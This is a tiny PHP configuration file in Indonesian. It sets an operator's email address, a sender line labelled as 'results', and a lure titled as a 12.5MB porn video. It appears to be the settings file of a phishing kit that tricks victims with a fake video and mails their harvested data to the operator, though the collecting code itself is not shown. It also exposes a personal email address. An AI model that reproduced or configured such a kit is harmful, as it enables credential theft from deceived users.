<?php

$emailku = 'bagasarya752@gmail.com'; // EMAIL KAMU

$sender = 'From: 🔫 Bagas Arya 🔫 <hasil@mlryu.com>'; 

$ukuran = '12,5MB' ; 
$judul = 'Video Bokep.mp4' ; 
?>
